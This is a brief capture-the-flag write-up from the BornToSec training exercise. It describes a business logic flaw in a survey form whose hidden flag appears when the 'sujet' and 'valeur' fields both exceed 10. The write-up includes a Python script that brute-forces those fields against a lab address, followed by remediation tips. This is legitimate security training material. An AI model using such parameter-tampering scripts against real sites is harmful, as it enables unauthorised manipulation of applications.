# Buisness Logic Vulnerability

## Description
The server-side logic likely has a condition that checks the values of the `sujet` and `valeur` fields. If both values exceed 10, the application responds differently. This behavior indicates that the application logic was not properly secured or validated, allowing you to manipulate input values to trigger unintended functionality.

## BornToSec
I didnt even know what i was doing but i noticed a form with a `sujet` and `valeur` field. At the beginning i tried logic values (between 1 and 10) and then i wrote a script to test all the values from 1 to 100. I noticed that when both values are greater than 10, the application responds differently. 

Here is the script : 
```python
import requests

def changeValueSurvey(url):
	for i in range(1, 100): 
		data = {
			'sujet':i,
			'valeur':i
		}
		r = requests.post(url, data=data)
		for line in r.text.splitlines():
			if 'flag' in line:
				print(line)

changeValueSurvey('http://10.11.249.222/?page=survey')
```

## How to fix it
- Validate Input on the Server Side: Ensure all user inputs are validated against strict rules.
- Avoid Hardcoding Business Logic in Forms: Do not rely on client-side or easily manipulated parameters for critical application logic.
